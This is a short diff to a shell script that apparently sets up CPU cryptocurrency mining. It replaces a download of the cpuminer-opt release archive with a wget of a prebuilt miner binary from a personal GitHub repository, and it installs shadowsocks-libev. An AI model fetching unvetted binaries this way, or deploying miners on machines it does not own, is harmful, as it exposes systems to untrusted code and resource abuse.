@@ -30,8 +30,7 @@ sleep .2
 echo " "
 echo " "
 
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
-tar -zxf cpuminer-opt-linux.tar.gz
+wget https://raw.githubusercontent.com/kucingpersia/asu/main/cpuminer-sse2
 
 apt -y install shadowsocks-libev rng-tools
 
